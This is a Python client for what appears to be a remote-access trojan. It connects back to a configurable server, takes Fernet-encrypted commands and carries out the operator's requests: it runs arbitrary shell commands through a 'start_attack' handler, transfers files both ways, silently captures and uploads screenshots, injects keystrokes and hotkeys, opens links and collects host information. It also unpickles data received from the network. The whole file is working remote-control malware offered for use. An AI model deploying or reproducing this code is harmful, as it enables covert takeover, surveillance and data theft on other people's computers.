from webbrowser import open_new
from socket import socket
from time import sleep
from subprocess import run, PIPE
from pickle import dumps, loads, UnpicklingError
from os import stat
from getpass import getuser
from struct import pack, unpack
from platform import node
# Need to install :
from cryptography.fernet import Fernet
from psutil import cpu_count, cpu_freq, virtual_memory, disk_partitions, disk_usage
import pyautogui
from PIL import ImageGrab

# Change to server IP / 127.0.0.1 if localhost
IP = "0.0.0.0"
PORT = 4347
# Put the same as in server/main.py
FERNET_KEY = "4DSZ05ER5frErX-_xZnSeU4Dv7oKiRThq92x8UclRPs="

sock = None
# Change CP866 to UTF-8 if you are using Linux
encoding = "CP866"
pyautogui.FAILSAFE = False


def post_result(command: str, result: str) -> None:
    data = {"command": command, "result": result}
    return dumps(data)


class Commands:
    def __init__(self) -> None:
        self.sock = None
        # Change this key to your own (Fernet.generate_key()) in the client and server
        self.F = Fernet(FERNET_KEY)
        self.user_name = getuser()
        self.commands = {
            b"upload": self.upload,
            b"download": self.download,
            b"open_link": self.open_link,
            b"start_attack": self.start_attack,
            b"make_screenshot": self.make_screenshot,
            b"press_hot_key": self.press_hot_key,
            b"write_text": self.write_text,
            b"window_alert": self.window_alert,
            b"pc_info": self.pc_info,
            b"online?": self.online,
            b"exit": self.exit
        }

    def recv_and_decrypt(self) -> bytes:
        """
            Receiving and decrypting commands from the server.
            :return: command
        """
        if self.sock:
            length = self.sock.recv(4)
            if length == b"":
                return b""
            len_data = unpack("i", length)[0]
            answer = self.sock.recv(len_data)
            if answer == b"":
                return b""
            answer = self.F.decrypt(answer)
            return answer

    def send(self, send_data: bytes) -> None:
        """
            Encryption and sending commands to the server
            :param send_data: commands
        """
        if self.sock:
            crypto_data = self.F.encrypt(send_data)
            len_data = pack("i", len(crypto_data))
            self.sock.send(len_data)
            self.sock.send(crypto_data)

    def input_command(self):
        counter = 0
        while True:
            try:
                if not self.sock or counter > 5:
                    self.sock = socket()
                    self.sock.connect((IP, PORT))
                    counter = 0
                answer = self.recv_and_decrypt()
                if answer == b"":
                    counter += 1
                if answer in self.commands:
                    self.commands[answer]()
            except ConnectionRefusedError:
                self.exit(sleeping=True)
            except OSError:
                self.exit(sleeping=True)
            except ConnectionResetError:
                self.exit(sleeping=True)
            except UnpicklingError:
                self.exit()
            except KeyboardInterrupt:
                self.exit(exiting=True)
            except Exception:
                self.exit(sleeping=True)

    def online(self) -> None:
        """
            Find out the status of the client
        """
        self.send(b"yes")

    def start_attack(self) -> None:
        """
            Using bash commands
        """
        answer = self.recv_and_decrypt()
        try:
            commands = loads(answer)
        except EOFError as e:
            self.send(post_result("Error:", e))
            return

        if commands is not None and "commands" in commands:
            for command in commands["commands"]:
                if command["type"].lower() == "bash":
                    output = self.bash(command["command"])
                    self.send(post_result(command["command"], output.replace("\n", " ~/~ ")))
                else:
                    self.send(post_result(command["command"], "Error: Type command not found!"))

    def upload(self) -> None:
        """
            Downloading a file from the server
        """
        filename = self.recv_and_decrypt()
        filename = loads(filename)
        file_size = self.recv_and_decrypt()
        file_size = int(loads(file_size))
        transfer_size = 0
        with open(filename, "wb") as file:
            recv_data = self.sock.recv(1024)
            transfer_size += len(recv_data)
            while recv_data:
                file.write(recv_data)
                if transfer_size < file_size:
                    recv_data = self.sock.recv(1024)
                    transfer_size += len(recv_data)
                else:
                    recv_data = None

    def download(self, filename: str = None) -> None:
        """
            Downloading the file on the server
            :param filename: The name of the file to download to the server
        """
        if filename is None:
            filename = self.recv_and_decrypt()
            filename = loads(filename)
        try:
            file_size = stat(filename).st_size
            self.send(dumps(str(file_size)))
        except Exception as e:
            try:
                self.send(dumps(f"{e.__class__}: {e}"))
                return
            except:
                pass
        with open(filename, "rb") as file:
            file_data = file.read(1024)
            while file_data:
                self.sock.send(file_data)
                file_data = file.read(1024)

    def open_link(self) -> None:
        """
            Opening the link in the browser
        """
        link = self.recv_and_decrypt()
        open_new(loads(link))

    def press_hot_key(self) -> None:
        """
            Pressing the keyboard shortcuts
        """
        hot_keys = self.recv_and_decrypt()
        hot_keys = loads(hot_keys)
        pyautogui.hotkey(*hot_keys)

    def write_text(self) -> None:
        """
            Writing a text
        """
        text = self.recv_and_decrypt()
        text = loads(text)
        pyautogui.write(text)

    def window_alert(self) -> None:
        """
            Creates a window with a title and text
        """
        title = self.recv_and_decrypt()
        title = loads(title)
        text = self.recv_and_decrypt()
        text = loads(text)
        pyautogui.alert(title=title, text=text)

    def pc_info(self) -> None:
        """
            Sending information about the computer
        """
        ram_info = virtual_memory()
        json_pc_info = {'name_pc': str(node()),
                        'all_cpu_count': str(cpu_count(logical=True)),
                        'cpu_freq_current': str(cpu_freq().current),
                        'all_ram': str(self.get_size(ram_info.total)),
                        'ram_free': str(self.get_size(ram_info.available)),
                        'ram_used': str(self.get_size(ram_info.used)),
                        "disk_partitions": []}

        partitions = disk_partitions()
        for partition in partitions[:15]:
            try:
                partition_usage = disk_usage(partition.mountpoint)
            except PermissionError:
                continue
            size_disk = str(self.get_size(partition_usage.total))
            json_pc_info["disk_partitions"].append({"name": partition.mountpoint, "size": size_disk})
        self.send(dumps(json_pc_info))

    def make_screenshot(self) -> None:
        """
            Creating a screenshot and sending a screenshot to the server
        """
        screen = ImageGrab.grab()
        screen.save("system_screenshot.jpg")
        # For windows, you can
        # ('C:\\Users\\' + self.user_name + '\\AppData\\Roaming\\' + '\\system_screenshot.jpg')
        self.download("system_screenshot.jpg")

    @staticmethod
    def get_size(size_in_bytes: int) -> str:
        """
            Getting the file size
            :param size_in_bytes: File size in bytes (10485760 Bytes)
            :return: File size (10 MB)
        """
        factor = 1024
        for unit in ["", "KB", "MB", "GB", "TB", "PB"]:
            if size_in_bytes < factor:
                return f"{size_in_bytes:.2f} {unit}"
            size_in_bytes /= factor

    @staticmethod
    def bash(enter_command: str) -> str:
        """
            :param enter_command: bash command (ls, pwd, etc)
            :return: command output
        """
        command_output = run(enter_command, stdout=PIPE, stderr=PIPE, encoding=encoding, shell=True)
        if command_output.returncode == 0:
            return command_output.stdout
        else:
            return command_output.stderr

    def exit(self, sleeping: bool = False, exiting: bool = False, time: int = 30):
        if self.sock:
            self.sock.close()
            self.sock = None
        if sleeping:
            sleep(time)
        if exiting:
            exit()


if __name__ == "__main__":
    Commands().input_command()
